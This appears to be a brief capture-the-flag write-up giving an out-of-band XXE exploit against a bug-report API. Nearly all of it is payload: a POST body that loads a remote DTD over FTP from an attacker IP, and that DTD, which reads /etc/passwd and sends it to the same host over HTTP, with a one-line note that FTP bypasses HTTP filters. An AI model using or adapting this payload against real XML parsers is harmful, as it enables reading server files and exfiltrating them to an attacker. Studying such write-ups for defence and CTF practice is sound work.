# bugreport (xxe)

### Payload

```
POST https://pasteweb.corp.geegle.org/api/bugreport/csp

<?xml version="1.0" ?>
<!DOCTYPE r [
<!ELEMENT r ANY >
<!ENTITY % sp SYSTEM "ftp://157.230.213.14/ev2.xml">
%sp;
]>
<test></test>
```

```
ftp://157.230.213.14/ev2.xml

<!ENTITY % data SYSTEM "file:///etc/passwd">
<!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://157.230.213.14/?%data;'>">
%param1;
```

### Idea
XXE, use FTP to bypass HTTP(s) filters

## author
adamyi
